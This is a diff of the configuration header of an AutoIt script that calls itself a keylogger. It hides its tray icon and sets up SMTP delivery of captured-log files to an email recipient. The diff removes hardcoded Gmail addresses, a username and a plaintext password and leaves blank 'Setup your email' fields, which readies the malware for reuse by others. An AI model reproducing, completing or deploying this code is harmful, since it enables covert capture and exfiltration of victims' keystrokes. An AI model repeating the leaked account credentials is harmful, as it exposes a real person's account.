@@ -1,19 +1,19 @@
 #Include <file.au3>
 #NoTrayIcon
 #region - SMTP Variables
-$SmtpServer = "smtp.gmail.com"
+$SmtpServer = "" ;Setup smtp server
 $FromName = "Keylogger"
-$FromAddress = "keylogr266@gmail.com"
-$ToAddress = "roanvanbao@gmail.com"
+$FromAddress = "" ; Setup your email
+$ToAddress = ""
 $Subject = "Track"
 $Body = ""
 $count = 1
 $date=@year&@mon&@mday
 $AttachFiles = @ScriptDir&"\linh"&$date&"-"&$count&".htm"
 $Importance = "Normal"
-$Username = "keylogr266"
-$Password = "helloworld"
-$IPPort=465
+$Username = "" ;Setup your account for mail
+$Password = "" ;Setup your password
+$IPPort= ;Setup your port
 $ssl=1
 
 Global $oMyRet[2]
